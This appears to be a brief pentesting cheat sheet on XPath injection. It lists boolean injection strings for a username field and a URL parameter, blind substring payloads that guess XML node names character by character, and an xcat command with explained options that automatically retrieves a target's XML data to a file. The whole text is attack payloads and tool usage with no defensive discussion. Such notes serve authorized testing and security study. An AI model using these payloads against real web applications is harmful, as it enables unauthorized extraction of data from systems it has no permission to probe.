Check the input if it can be injected 

    username = test' or '1'='1

**OR**

    http://xpath.site/getInfo.php?countryID=10 or '1'='1'


### Get the 1st child node name

    ' or substring(name(/*/*[1]), 1, 1)='a' 
    ' or substring(name(/*/*[1]), 2, 1)='a' 

<br/>

# XCAT

    xcat --method=GET http://xpath.site/getInfo.php countryID=1 countryID "Italy" run retrieve --output /root/Desktop/result.xml --format xml



- **countryID=1** is the query parameter.
- **countryID** is the parameter to be tested if we have more than one parameter.
- **Italy** is the value when the payload returns true.
- **run retrieve --output** to store the result in a file.
- **--format** is the format of the output file.